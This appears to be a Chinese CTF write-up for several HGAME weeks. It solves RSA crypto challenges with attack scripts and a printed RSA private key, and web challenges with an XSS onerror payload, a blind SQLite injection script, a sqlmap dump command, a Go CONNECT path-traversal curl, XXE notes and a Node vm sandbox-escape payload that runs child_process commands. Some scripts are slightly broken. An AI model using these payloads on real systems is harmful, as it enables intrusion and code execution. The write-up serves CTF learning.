为什么同样是两个变量，第一个使用let，而第二个使用var呢？因为使用 var 可 以利用 Object.keys(window) 拿到全局变量 flag 的变量名，而使用let的话无法获取。 这是官方wp的解释，复现之后发现可以直接用Object.values(window)读取这些全局变量的内容，也就是直接获得flag &lt;img src=1 onerror=\"document.getElementsByClassName('content')[0].innerHTML= Object.values(window)\"> 由于提示里这个flag定义在了一个script标签里，我们也可以用document.scripts来读出script标签里的内容 &lt;img src&#x3D;1 onerror&#x3D;&quot;document.getElementsByClassName(&#39;content&#39;) [0].innerText&#x3D;document.scripts[0].text;&quot;&gt; CRYPTORSA Attackrsa真是全套脚本就行 加密脚本 from Crypto.Util.number import getPrime from libnum import s2n from secret import flag m &#x3D; s2n(flag) e &#x3D; 65537 p &#x3D; getPrime(80) q &#x3D; getPrime(80) n &#x3D; p * q c &#x3D; pow(m, e, n) print(&quot;e &#x3D;&quot;, e) print(&quot;n &#x3D;&quot;, n) print(&quot;c &#x3D;&quot;, c) 正常的rsa加密，给了e，n，c求m 在线网站分解n得到pq import gmpy2 from libnum import n2s def Decrypt(c, e, p, q): L &#x3D; (p - 1) * (q - 1) d &#x3D; gmpy2.invert(e, L) n &#x3D; p * q m &#x3D; gmpy2.powmod(c, d, n) flag &#x3D; n2s(int(m) print(flag) if __name__ &#x3D;&#x3D; &#39;__main__&#39;: p &#x3D; 715800347513314032483037 q &#x3D; 978782023871716954857211 e &#x3D; 65537 c &#x3D; 122622425510870177715177368049049966519567512708 Decrypt(c, e, p, q) RSA Attack 2加密脚本 import re from math import ceil from Crypto.Util.number import getPrime from libnum import s2n #flag_parts &#x3D; list(map(s2n, re.findall(rf&quot;.&#123;&#123;,&#123;ceil(len(flag) &#x2F; 3)&#125;&#125;&#125;&quot;, flag))) print(&quot;# task1&quot;) m &#x3D; 42949244670170607238949839659191560916635942982341043413490558510 e &#x3D; 65537 p &#x3D; 118106171709518613190337380120721639096109433871758551481750559628607841525199933396401045857313841962667087681000077908575349856203197989280137518119610447265022793158335778819939567162786340083036604758380394175830091289942677310940962706354018362632488404102976344446903748276214668285468119214940392725123 q &#x3D; 123715343521970684000128799876071042830570723218116931151467220244765055889417626806554868114525566978436323975083498703832794561493291312079691396671274837322036085911028636844643698862533724625315331567014898932701977758733187411738771617885153639118174062773966499612201555575923412045644028857989016603411 r &#x3D; 169239143092963922213343686924677363088963485633027091645501151388482565490233323796889691624272664985173525812002355530484741432847170511348177065704338978754457533424010842217007432554862861949141613925946472939183705336155629494107050470952474816647080432002189309272835581148740211208678012416960136441833 n1 &#x3D; p * q c1 &#x3D; pow(m, e, n1) n2 &#x3D; r * q c2 &#x3D; pow(m, e, n2) print(&quot;e &#x3D;&quot;, e) print(&quot;n1 &#x3D;&quot;, n1) print(&quot;c1 &#x3D;&quot;, c1) print(&quot;n2 &#x3D;&quot;, n2) print(&quot;c2 &#x3D;&quot;, c2) print(&quot;# task2&quot;) m &#x3D; 26926584401348540331333678102939069838976561137078484378892509505 e &#x3D; 7 p &#x3D; getPrime(1024) q &#x3D; getPrime(1024) n &#x3D; 14157878492255346300993349653813018105991884577529909522555551468374307942096214964604172734381913051273745228293930832314483466922529240958994897697475939867025561348042725919663546949015024693952641936481841552751484604123097148071800416608762258562797116583678332832015617217745966495992049762530373531163821979627361200921544223578170718741348242012164115593777700903954409103110092921578821048933346893212805071682235575813724113978341592885957767377587492202740185970828629767501662195356276862585025913615910839679860669917255271734413865211340126544199760628445054131661484184876679626946360753009512634349537 c &#x3D; pow(m, e, n) print(&quot;e &#x3D;&quot;, e) print(&quot;n &#x3D;&quot;, n) print(&quot;c &#x3D;&quot;, c) print(&quot;# task3&quot;) m &#x3D; flag_parts[2] p &#x3D; getPrime(1024) q &#x3D; getPrime(1024) n &#x3D; p * q e1 &#x3D; getPrime(32) e2 &#x3D; getPrime(32) c1 &#x3D; pow(m, e1, n) c2 &#x3D; pow(m, e2, n) print(&quot;n &#x3D;&quot;, n) print(&quot;e1 &#x3D;&quot;, e1) print(&quot;c1 &#x3D;&quot;, c1) print(&quot;e2 &#x3D;&quot;, e2) print(&quot;c2 &#x3D;&quot;, c2) 将flag分了三段后分别用了不同的加密方式 第一段 代码能看出n1和n2有共同的素因子，那么可以利用欧几里得算法直接将 n1 和 n2 分解。通过欧几里得算法可以直接求出 n1 和 n2 的最大公约数 p: output给了e,n1,n2,c1,c2 def gcd(a, b): if a &lt; b: a, b &#x3D; b, a while b !&#x3D; 0: temp &#x3D; a % b a &#x3D; b b &#x3D; temp return a def gcd_digui(a, b): if b !&#x3D; 0: return a return gcd(b, a % b) n1 &#x3D; 14611545605107950827581005165327694782823188603151768169731431418361306231114985037775917461433925308054396970809690804073985835376464629860609710292181368600618626590498491850404503443414241455487304448344892337877422465715709154238653505141605904184985311873763495761345722155289457889686019746663293720106874227323699288277794292208957172446523420596391114891559537811029473150123641624108103676516754449492805126642552751278309634846777636042114135990516245907517377320190091400729277307636724890592155256437996566160995456743018225013851937593886086129131351582958811003596445806061492952513851932238563627194553 n2 &#x3D; 20937478725109983803079185450449616567464596961348727453817249035110047585580142823551289577145958127121586792878509386085178452171112455890429474457797219202827030884262273061334752493496797935346631509806685589179618367453992749753318273834113016237120686880514110415113673431170488958730203963489455418967544128619234394915820392908422974075932751838012185542968842691824203206517795693893863945100661940988455695923511777306566419373394091907349431686646485516325575494902682337518438042711296437513221448397034813099279203955535025939120139680604495486980765910892438284945450733375156933863150808369796830892363 p &#x3D; gcd(n1, n2) q &#x3D; n1&#x2F;&#x2F;p r &#x3D; n2&#x2F;&#x2F;p print(p) print(q) print(r) p&#x3D;123715343521970684000128799876071042830570723218116931151467220244765055889417626806554868114525566978436323975083498703832794561493291312079691396671274837322036085911028636844643698862533724625315331567014898932701977758733187411738771617885153639118174062773966499612201555575923412045644028857989016603411 q&#x3D;118106171709518613190337380120721639096109433871758551481750559628607841525199933396401045857313841962667087681000077908575349856203197989280137518119610447265022793158335778819939567162786340083036604758380394175830091289942677310940962706354018362632488404102976344446903748276214668285468119214940392725123 r&#x3D;169239143092963922213343686924677363088963485633027091645501151388482565490233323796889691624272664985173525812002355530484741432847170511348177065704338978754457533424010842217007432554862861949141613925946472939183705336155629494107050470952474816647080432002189309272835581148740211208678012416960136441833 这就相当于有了enc，带到前一个题的代码里得到 hgame{RsA@hAS!a&amp;VArIETY?of. 第二段 e=7像低加密指数分解攻击，直接开七次方 import gmpy2 from libnum import n2s e &#x3D; 7 # 读入 n, 密文 n &#x3D; 14157878492255346300993349653813018105991884577529909522555551468374307942096214964604172734381913051273745228293930832314483466922529240958994897697475939867025561348042725919663546949015024693952641936481841552751484604123097148071800416608762258562797116583678332832015617217745966495992049762530373531163821979627361200921544223578170718741348242012164115593777700903954409103110092921578821048933346893212805071682235575813724113978341592885957767377587492202740185970828629767501662195356276862585025913615910839679860669917255271734413865211340126544199760628445054131661484184876679626946360753009512634349537 c &#x3D; 10262871020519116406312674685238364023536657841034751572844570983750295909492149101500869806418603732181350082576447594766587572350246675445508931577670158295558641219582729345581697448231116318080456112516700717984731655900726388185866905989088504004805024490513718243036445638662260558477697146032055765285263446084259814560197549018044099935158351931885157616527235283229066145390964094929007056946332051364474528453970904251050605631514869007890625 print(&#39;n&#x3D;&#39;, n) print(&#39;c&#x3D;&#39;, c) result &#x3D; gmpy2.iroot(c, 7) print(&#39; [-]The c has cubic root?&#39;, result[1]) if result[1]: print(&#39; [-]The m is:&#39;, &#39;&#123;:x&#125;&#39;.format(result[0])) 得到m = 0x41747461634b5e6d4554686f64535e776841543a6f746865722141 转字符串的为AttacK^mEThodS^whAT:other!A 第三段 共模攻击 from gmpy2 import * from libnum import n2s n &#x3D; 18819509188106230363444813350468162056164434642729404632983082518225388069544777374544142317612858448345344137372222988033366528086236635213756227816610865045924357232188768913642158448603346330462535696121739622702200540344105464126695432011739181531217582949804939555720700457350512898322376591813135311921904580338340203569582681889243452495363849558955947124975293736509426400460083981078846138740050634906824438689712748324336878791622676974341814691041262280604277357889892211717124319329666052810029131172229930723477981468761369516771720250571713027972064974999802168017946274736383148001865929719248159075729 e1 &#x3D; 2519901323 e2 &#x3D; 3676335737 s &#x3D; gcdext(e1, e2) s1 &#x3D; s[1] s2 &#x3D; -s[2] c1 &#x3D; 3230779726225544872531441169009307072073754578761888387983403206364548451496736513905460381907928107310030086346589351105809028599650303539607581407627819797944337398601400510560992462455048451326593993595089800150342999021874734748066692962362650540036002073748766509347649818139304363914083879918929873577706323599628031618641793074018304521243460487551364823299685052518852685706687800209505277426869140051056996242882132616256695188870782634310362973153766698286258946896866396670872451803114280846709572779780558482223393759475999103607704510618332253710503857561025613632592682931552228150171423846203875344870 c2 &#x3D; 940818595622279161439836719641707846790294650888799822335007385854166736459283129434769062995122371073636785371800857633841379139761091890426137981113087519934854663776695944489430385663011713917022574342380155718317794204988626116362865144125136624722782309455452257758808172415884403909840651554485364309237853885251876941477098008690389600544398998669635962495989736021020715396415375890720335697504837045188626103142204474942751410819466379437091569610294575687793060945525108986660851277475079994466474859114092643797418927645726430175928247476884879817034346652560116597965191204061051401916282814886688467861 e2 &#x3D; 3676335737 c2 &#x3D; invert(c2, n) m &#x3D; (pow(c1, s1, n) * pow(c2, s2, n)) % n print(m) print(n2s(int(m))) 最终flag hgame&#123;RsA@hAS!a&amp;VArIETY?of.AttacK^mEThodS^whAT:other!AttACK|METHOdS~do@you_KNOW&#125; 第三周wpCRYPTO这周密码比上周要简单 Multi Prime RSA加密脚本 给了这除了flag其他的变量都给了 p &#x3D; 61789932148719477384027458333380568978056286136137829092952317307711908353477 q &#x3D; 91207969353355763685633284378833506319794714507027332929290701748727534193861 r &#x3D; 105471299607375388622347272479207944509670502835651250945203397530010861809367 s &#x3D; 83153238748903772448138307505579799277162652151244477391465130504267171881437 n &#x3D; 1039344372165087100001063920598151812324151064684841845250974758525265148567706103784958424873181721352440209284812493753972556519482026327282644619091466886523804841248277210353173383407944598453848113815866908595335619458549486958764490103808475329598085842184963065068499489886467911087295087163762599284622055185456905774507245781667293199205317692029829495961487347944813874415423771980660778986211145841712412631156369129146470119135136378158203459576596246169191419488560832734046076107673091995860021863239882608638458149930255944184863801278386551031980146460231515747754411678651752698881001464973981424240781413084941947261875289725538959720572496329348499870580057997540844488309111059240745081048324762866572948371222839278718034435739827677190025500802453626872356208612718417249649474571197167076916403582394186357812640566250930361276229969553128128312736245440129556020108188835966131425956431796417720436474093381770796431629523054378258497546013222494974549262140415585158985940966415459478150722832119691308697510189026447359189994055885090735411738332296254011208547676914004864732327863884217733456287369771087094514708468685641820375220835485053482570852619363091173324203334503461823983610886849930944250553928855506012684504211525542998575275626784129736345142772399109273619522445919 e &#x3D; 65537 c &#x3D; 844677395496466411520394190869787261209960246734415406217975986418865760680024542119231873259131861208878522030009923057991526761346423130242121884493257732067700857897379859545356609151834223804262174935191718271211809221730601602827122249238086030580971376104724987801049500689134122609834321586609223761140538079460830213824674361601046367637227094018381901291488659642720549583856812747877519600804325570421770575999289389175021646347371879234023647657507178519047236746071420327155188213839293382288787853777540226192644761028822256165706787395891134765908229036044468473519166141610604791485071702808854944672418124203289328124793348198048601338476086482318248264508789781967910205393740835345086784345145351367491197717933757414967811594913692588314161669333147733048171044386546892346475181197482702164468542430187885074163177843285948999943328049159021873821254267471067523609151007885131921896462161216356454116929796355815756642621369974260365378070336290542971599886325232821981080341858950609157813769416455337935096696635623426418166316737131174435618543058086342714723330814586496030805366321181723292731710369013923285787724941830672247377301048663929453294620044701627159066468762709113137517559435822623284148112827473010030736329596829357275518641576798298066541516764673029908084962144713 直接找个rsa的解密脚本带进去就行 RSA Attack 3加密脚本 from Crypto.Util.number import getPrime from gmpy2 import invert from libnum import s2n from secret import flag p &#x3D; getPrime(2048) q &#x3D; getPrime(2048) n &#x3D; p * q d &#x3D; getPrime(64) e &#x3D; invert(d, (p - 1) * (q - 1)) c &#x3D; pow(s2n(flag), e, n) print(f&quot;n &#x3D; &#123;n&#125;&quot;) print(f&quot;e &#x3D; &#123;e&#125;&quot;) print(f&quot;c &#x3D; &#123;c&#125;&quot;) 只给了nec，想要得到明文还要有d，要求d就要指定pq。 利用rsactftool求公钥私钥文件然后得到pq 得到公钥 -----BEGIN PUBLIC KEY----- MIIEIDANBgkqhkiG9w0BAQEFAAOCBA0AMIIECAKCAgB8YNfjXEOhimdPq0kh+WM0 IfRLCvq&#x2F;XAePL0PkAM55+&#x2F;nlEzPvZxW9PHi64GAYcMXPUVIxWvhbkXrVJkxt2+Gz B13g1yCAebp0DeN9RbSPvV08IWsZnzHG8&#x2F;tV9UEByd76xOEO1MTanUBdrewtp0NW tkHvMKwmuKFVOWKypHT8JGnwZw5FOGV9ABTJ4i2vA8WPcf36M2HRRIlUO6IXIZYc BMoORsCwF4XJ+6xyZNDIXKdt2hYkm6M6ywCvRKj1Wj6zjls1eNt5mO8OOShMvs&#x2F;M XamEESd8Wv6qG4Dmld&#x2F;HmYVoBWqa1mw7r2g46xf3hzDtcU9FIkypszXLh+9TK&#x2F;OE fZFqUq0jM97Sl9ltGvEkRfP4QEDA&#x2F;MJxNtPk72pXmtx0iXmotX8SRSxvb3nksQXQ eWrncKwZ58wY&#x2F;pVFZxKCzlJO5VUqdRSymtez1wqQZoQORQdt&#x2F;iDOj4VB4fuL5VEs z6Svc9izyYaP4JCg67S6UQoTOipUnLYX+DcR2jkVpwgCLkaC3Qqipkm0prE77OzA tWen+aX6HZXAluZZrOXBc1dq795CS9jSjn&#x2F;ESSfucY2XX1FdPBlaEpTt2QXW1l0c ZtDZq9hylZa&#x2F;zwdynj+DQq1iz&#x2F;Tn15+f0iEV1xIIOUemq3gec5N&#x2F;YXHoLqzv208D aIXOH0fPWF1xho9D0ji4XwKCAgAS80JghvxDHD8c9vFPSKymBJ28qaUmYvDWWxUG gMpjfaV3H65MmMFQMAFmTGYbNlUSBpXs8nLc20lTyoFF67Cb6IUxpZiooKg6UaEn 6z1w5ZgMINeUMNz0SFlBxO3DyiSoTyQvAu4QGtQay69VJPH5fgk&#x2F;A3IrnavkX8&#x2F;V w03OyOBdwcYXqvE&#x2F;QHmTzdLBywN7updQFsN06IUJxIuGS+iI9PHMkQ8TzwYnRzbI 38TcA1ulPzWBYxmFqf+nell4W&#x2F;O9HKzTjChULhpX2BRztLIk5jcyNr0v76flroGu J+FUkD1dbuljRR5MHOYKi7V22grnxTr97W7IsSO1x+UeLGcOcKiDweh&#x2F;su1THCX1 h3sxB8pffkJ1b6hNPCRD5Xzdtd8NpddzejKvP3Zz5kWnrjCv&#x2F;t5nrMKbo1qy9T4&#x2F; vBl1naLBDCBD2D6&#x2F;4peeJ0NDZICGwQN2xaEuGZHnsNSMDWTENIqh8jA11&#x2F;CevOCy fC4dhgwfNbCg6puxdT&#x2F;cz3LVLMvkPtKoPra1eOnCADWl7xVdVW9ZoWvXJUPYVb7G U1zi8xC41aUNRHyxqGzKXE68sZRKUb+jn1rIgzXE1CX+tX&#x2F;GuzoqeaixXQyUsr9c zerj6DiU5mBgAst5wVebvt1Izy36cLtgVe0zTgJp7pkPr+oQ8aJRw1J2&#x2F;8s8Q91I kjfB7w&#x3D;&#x3D; -----END PUBLIC KEY----- 再用公钥求私钥 得到私钥 -----BEGIN RSA PRIVATE KEY----- MIIHOgIBAAKCAgB8YNfjXEOhimdPq0kh+WM0IfRLCvq&#x2F;XAePL0PkAM55+&#x2F;nlEzPv ZxW9PHi64GAYcMXPUVIxWvhbkXrVJkxt2+GzB13g1yCAebp0DeN9RbSPvV08IWsZ nzHG8&#x2F;tV9UEByd76xOEO1MTanUBdrewtp0NWtkHvMKwmuKFVOWKypHT8JGnwZw5F OGV9ABTJ4i2vA8WPcf36M2HRRIlUO6IXIZYcBMoORsCwF4XJ+6xyZNDIXKdt2hYk m6M6ywCvRKj1Wj6zjls1eNt5mO8OOShMvs&#x2F;MXamEESd8Wv6qG4Dmld&#x2F;HmYVoBWqa 1mw7r2g46xf3hzDtcU9FIkypszXLh+9TK&#x2F;OEfZFqUq0jM97Sl9ltGvEkRfP4QEDA &#x2F;MJxNtPk72pXmtx0iXmotX8SRSxvb3nksQXQeWrncKwZ58wY&#x2F;pVFZxKCzlJO5VUq dRSymtez1wqQZoQORQdt&#x2F;iDOj4VB4fuL5VEsz6Svc9izyYaP4JCg67S6UQoTOipU nLYX+DcR2jkVpwgCLkaC3Qqipkm0prE77OzAtWen+aX6HZXAluZZrOXBc1dq795C S9jSjn&#x2F;ESSfucY2XX1FdPBlaEpTt2QXW1l0cZtDZq9hylZa&#x2F;zwdynj+DQq1iz&#x2F;Tn 15+f0iEV1xIIOUemq3gec5N&#x2F;YXHoLqzv208DaIXOH0fPWF1xho9D0ji4XwKCAgAS 80JghvxDHD8c9vFPSKymBJ28qaUmYvDWWxUGgMpjfaV3H65MmMFQMAFmTGYbNlUS BpXs8nLc20lTyoFF67Cb6IUxpZiooKg6UaEn6z1w5ZgMINeUMNz0SFlBxO3DyiSo TyQvAu4QGtQay69VJPH5fgk&#x2F;A3IrnavkX8&#x2F;Vw03OyOBdwcYXqvE&#x2F;QHmTzdLBywN7 updQFsN06IUJxIuGS+iI9PHMkQ8TzwYnRzbI38TcA1ulPzWBYxmFqf+nell4W&#x2F;O9 HKzTjChULhpX2BRztLIk5jcyNr0v76flroGuJ+FUkD1dbuljRR5MHOYKi7V22grn xTr97W7IsSO1x+UeLGcOcKiDweh&#x2F;su1THCX1h3sxB8pffkJ1b6hNPCRD5Xzdtd8N pddzejKvP3Zz5kWnrjCv&#x2F;t5nrMKbo1qy9T4&#x2F;vBl1naLBDCBD2D6&#x2F;4peeJ0NDZICG wQN2xaEuGZHnsNSMDWTENIqh8jA11&#x2F;CevOCyfC4dhgwfNbCg6puxdT&#x2F;cz3LVLMvk PtKoPra1eOnCADWl7xVdVW9ZoWvXJUPYVb7GU1zi8xC41aUNRHyxqGzKXE68sZRK Ub+jn1rIgzXE1CX+tX&#x2F;GuzoqeaixXQyUsr9czerj6DiU5mBgAst5wVebvt1Izy36 cLtgVe0zTgJp7pkPr+oQ8aJRw1J2&#x2F;8s8Q91IkjfB7wIJALW5aE5wHIlPAoIBAQCo tra8EGmcotwH&#x2F;ZDGjC4Z8ogha4CMuHNdkeIBwjStJor8O0NCarLdkQT6NMtSUYBN 5lcKx7upYPmL7ZPVnmcV9le23PFZpVSgILJO5e85BwwdJVhToam3u8uEh47B2enI FkWTMO18zvYBFrLqB8VgUfsQN4isa5HbQFI9T9MDe0TugTNnLC6kx6aKpVBsUqmk aUOzN586tD0Ppo6kW570+4GdepUqKyGjnz80d2fwStarw8Ez67IKEhOSDEiAyuoN duZRC4gZVfhHX&#x2F;umElWVmtfbtJGHmbCf2+g&#x2F;3PZy65f5qNqwGHxd3zU5tku2EVT9 h01jhuwEZLuinp3L1t6pAoIBAQC8uh&#x2F;FzJl8zlzGon3u0V0SSgjI9oWStsp2K6Fl IDEWTAVMdYQZCOwxObcVwivwz8ovDMmvoA3hKBh+8rzmJeYJ3MyubkCV+FNo&#x2F;y1X DzJdemGbAyPUnEeCgOEbJrqHqzk1W0d6oLtr6HuSIswK4yNglsLWM+16S+WQEKi2 E1yuzC+uq279ezOx39FbXGxlLDSyKOb9oJXVuZWnhCyJA27d&#x2F;cYDlmSQ0JvX3xiD fG10MYFOSqpDsNS7LLOf+LK8WRH4m6iFQHcX7sgs6HH48ACig+agyRSJCaN&#x2F;b&#x2F;PQ 6o99jpkCmYSo2vO8qScAZFbEucrjtOkOtWOBhc9xrSbPuWvHAgkAtbloTnAciU8C CQC1uWhOcByJTwKCAQAl77&#x2F;PElSLSo1fNYoMKafuVi48Fjx0iUntMVmcNB7Xe9hV CAIojVVQu2ux1w&#x2F;91oMgui8wbN6dbZg&#x2F;cd0CgLtxfgwhTjX75CxB97oahAkxuP3L BeqOHx2uy6B6TNfFHR76srqhQxgz9MWW8IUstpNnBV91CtOYyRBQsCuKchS+Asb+ Z3+W08eWjKNN68jPBohKjD15FYy4&#x2F;W03t2NBtKNb7UoLynBTni&#x2F;Bjq86ZWNOUG3v gPuI48t&#x2F;Px2F4wS51wfzGZDfutBNM2dO+a3DcwNGctqkxFriQuD0tQkYtei6R92f lUtMgGyxmfNgmbdycrcjDislpPUj9+NkD1ce2f28 -----END RSA PRIVATE KEY----- 再利用私钥求pq 得到pq之后找个rsa脚本带进去就行 Block Cipher加密脚本 给了三个值 iv = b&#39;Up\\x14\\x98r\\x14%\\xb9&#39; key = b&#39;\\r\\xe8\\xb86\\x9c33^&#39; parts = [b&#39;0\\xff\\xcd\\xc3\\x8b\\T\\x8b&#39;, b&#39;RT\\x1e\\x89t&amp;\\x17\\xbd&#39;, b&#39;\\x1a\\xee\\x8d\\xd6\\x9b&gt;w\\x8c&#39;, b&#39;9CT\\xb3^pF\\xd0&#39;] 加密的逻辑大致是将flag每八个字符一组，不够的在末尾加上chr(len(该段长度))重复一定次数凑够八个字符,同时构造有八组数据的iv和key变量，并与flag分成的组进行一次异或操作，将异或操作后的内容作为下一次异或操作的iv。同时将异或后的内容放入results列表中 其中返回值的内容都是可迭代类型，所以要利用for循环才能读出里面的内容 八个一组的数字 也就相当于第一组48 = 85^13^ord(flag的第一个字符)即ord(&#39;h&#39;) 经过测试这个也能逆推 所以只要根据加密脚本将flag变为给的parts里的内容就能分段解密 WEBSecurityCenter看一下这个路径 再结合 猜测是twig的模板注入 参考链接 https://whoamianony.top/2021/08/22/Web%E5%AE%89%E5%85%A8/Twig%20%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/ cat应该是被过滤了，可以用tac看一下 把含有hgame内容的字符串也过滤了，尝试逆向输出 成功，拿到flag Vidar shop demo看这个描述就像条件竞争 先随便注册个账户进入 看看商店，flag要一万，我们只有九千九百九十九 先买个徽章试试 发现购买的徽章如果删除，购买花费的钱也会返还，所以试试再开一个网页，同时删除徽章 成功大于一万了，买个flag LoginMe*sql注入，给的hint很明显就是sql语句 但是因为平常的题都是mysql的，这个是 sqlite，所以只试出了注入点，其他的就没注 sqlite因为其比较简易每个db文件就是一个数据库，所以不存在information_schema数据库，但存在类似作用的表sqlite_master。 该表记录了该库下的所有表，索引，表的创建sql等所以我们可以通过此读取数据，常见语句如下。 1 读取表名：select group_concat(name) from sqlite_master where type&#x3D;&#39;table&#39; 2 读取字段：select group_concat(sql) from sqlite_master where type&#x3D;&#39;table&#39; and name&#x3D;&#39;表名&#39; 看看表名 证明确实能注，可以写个脚本 反正最后表名是uuussseeerrrsss 后边的脚本（手注太慢了 import requests url &#x3D; &quot;http:&#x2F;&#x2F;d51f66203d.login.summ3r.top:60067&#x2F;login&quot; date &#x3D; &#123;&quot;username&quot;:&quot;test&#39;) and substr((select sql from sqlite_master where type&#x3D;&#39;table&#39; and name&#x3D;&#39;uuussseeerrrsss&#39;),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;--+&quot;,&quot;password&quot;:&quot;test&quot;&#125; flag &#x3D; &#39;&#39; for i in range(1,200): for j in range(31,127): #列名 #date[&quot;username&quot;] &#x3D; &quot;test&#39;) and substr((select sql from sqlite_master where type&#x3D;&#39;table&#39; and name&#x3D;&#39;uuussseeerrrsss&#39;),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;--+&quot;.format(i,chr(j)) #读数据 date[&quot;username&quot;] &#x3D; &quot;test&#39;) and substr((select group_concat(password) from uuussseeerrrsss),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;--+&quot;.format(i,chr(j)) r &#x3D; requests.post(url,json&#x3D;date); response &#x3D; r.text if &#39;success&#39; in response: flag +&#x3D;chr(j) print(flag) break print(flag) 拿到密码之后登录就行 也可以用sqlmap直接跑 bp抓包之后保存到本地 然后上sqlmap python sqlmap.py -r &quot;D:\\Desktop\\post.txt&quot; --dump --batch --threads 10 --no-cast --flush-session 第四周wpWEBFileSystem又是go语言的题 很明显flag在there may be a flag里但是没法访问到 因为根据main.go里的内容可以看到这个路由被出题人加上了web服务,从而使得我们没法通过直接访问/there may be a flag来获取文件。而是得到/there may be a flag路由的回显。 谷歌找一下ctf里出现过的go语言漏洞 https://bycsec.top/2021/02/07/golang%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/ 利用相对路径访问 对于 CONNECT 请求，路径和主机保持不变。 和这道题的考点一模一样，可以仿照其payload仿写一个 curl --path-as-is -X CONNECT http:&#x2F;&#x2F;6a87cb1c66.filesystem.hgame.homeboyc.cn&#x2F;main.go&#x2F;..&#x2F;there_may_be_a_flag Comment*考点：xxe注入 源码： &lt;?php require &#39;.&#x2F;init.php&#39;; require_once &#39;.&#x2F;db.php&#39;; libxml_disable_entity_loader(false); function waf($str): bool &#123; if (preg_match(&#39;&#x2F;file|glob|http|dict|gopher|php|ftp|ssh|phar&#x2F;i&#39;, $str)) &#123; return true; &#125; return false; &#125; function save() &#123; if ($_SERVER[&#39;REQUEST_METHOD&#39;] !&#x3D; &#39;POST&#39;) &#123; echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;wrong method&#39;]); return; &#125; $data &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;); if (waf($data)) &#123; http_response_code(403); echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;Hacker!&#39;]); return; &#125; $id &#x3D; $_SESSION[&#39;unique_id&#39;]; $db &#x3D; getDB(); $stmt &#x3D; $db-&gt;prepare(&#39;INSERT INTO comments (sender,content) VALUES (?,?)&#39;); $stmt-&gt;execute([$id, $data]); if ($stmt-&gt;rowCount() !&#x3D; 0) &#123; echo json_encode([&#39;msg&#39; &#x3D;&gt; &#39;success&#39;]); &#125; else &#123; http_response_code(500); echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;failed to create records&#39;]); &#125; &#125; function parseXML($str) &#123; $dom &#x3D; new DOMDocument(); try &#123; $dom-&gt;loadXML($str, LIBXML_NOENT | LIBXML_DTDLOAD); &#125; catch (Exception $e) &#123; http_response_code(400); echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;invalid xml data&#39;]); die(); &#125; $attrs &#x3D; simplexml_import_dom($dom); if (!isset($attrs-&gt;content)) &#123; http_response_code(400); echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;content is empty&#39;]); die(); &#125; if (waf($attrs-&gt;sender) || waf($attrs-&gt;content)) &#123; http_response_code(403); echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;Hacker!&#39;]); die(); &#125; if ($attrs-&gt;sender &#x3D;&#x3D; &#39;admin&#39; &amp;&amp; !preg_match(&#39;&#x2F;admin&#x2F;i&#39;, $str)) &#123; $flag &#x3D; &#39;hgame&#123;xxxxx&#125;&#39;; $attrs-&gt;content &#x3D; $flag; &#125; return $attrs; &#125; function get() &#123; $id &#x3D; $_SESSION[&#39;unique_id&#39;]; $db &#x3D; getDB(); $stmt &#x3D; $db-&gt;prepare(&#39;SELECT * FROM comments WHERE sender&#x3D;?&#39;); $stmt-&gt;execute([$id]); $data &#x3D; $stmt-&gt;fetchAll(); $result &#x3D; []; foreach ($data as $key &#x3D;&gt; $val) &#123; array_push($result, parseXML($val[&#39;content&#39;])); &#125; echo json_encode($result); &#125; switch ($_GET[&#39;action&#39;]) &#123; case &#39;get&#39;: get(); break; case &#39;add&#39;: save(); break; case &#39;info&#39;: echo json_encode([&#39;unique_id&#39; &#x3D;&gt; $_SESSION[&#39;unique_id&#39;]]); break; default: http_response_code(400); echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;no such action&#39;]); break; &#125; 先抓个包看看 挺明显的xxe 然后就要满足获取flag的条件 要求sender里有admin但是传入的内容不许有admin 可以尝试data协议 （比赛的时候不知道怎么想的一直想绕过waf读文件。。。忘了data协议 Markdown Online*看一下源码 toUpperCase()是将小写转换为大写，但是这样也绝不可能绕过54gk的这个if判断 利用了try catch但是catch并没有return语句，也就导致try中的代码抛出错误后继续往下执行 所以就要想办法让req.body.password = req.body.password.toUpperCase()报错 对 req.body.password.toUpperCase() 正确的解读方式是：获取 req.body.password对象的 toUpperCase属性，然后把这个属性当作函数来调用。如果这个属性不是函数对象就会抛出错误 所以可以用 &#123;\"username\":\"admin\",\"password\":[\"1\",\"1\",\"1\",\"1\",\"1\",\"1\",\"1\",\"1\",\"1\",\"1\",\"1\",\"1\",\"1\",\"1\",\"1\",\"1\"]&#125; 或 &#123;\"username\":\"admin\",\"password\":&#123;\"length\": 16&#125;&#125; 都可以满足第一个if的length==16的判断并让toUpperCase()报错 然后我们访问/md 在这部分 利用markdownit库，并对html标签支持 在提交的地方 在 SubmitController 里，markdown-it 解析出来的 html 代码会被 zombie.js 加载，zobmie.js 在遇到 JavaScript 代码的时候会将其交给 vm 虚拟机执行 而vm模块是存在逃逸的， JavaScript 对象的继承是靠原型链实现的，借助原型链可访问到 vm 沙箱以外的内容，实现 RCE 百度找个vm逃逸的payload this.__proto__.constructor.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;calc&#39;) 然后还要绕过waf 利用 JavaScript 的语言特性， obj.contructor 可以变为 obj[&quot;contr&quot;+&quot;uctor&quot;] 的形式， + 也被 ban 了，可以用concat拼接字符串的形式: obj[&quot;constru&quot;.concat(&quot;ctor&quot;)] this 和 process 可以用 eval(&quot;th&quot;+&quot;is&quot;) 的形式绕过。 这里eval和String.fromCharCode都没被过滤，可以用这个绕过 a &#x3D; &quot;document.write(this.__proto__.constructor.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;ls &#x2F;&#39;))&quot; b &#x3D; [] for i in range(len(a)): b.append(ord(a[i])) print(b) 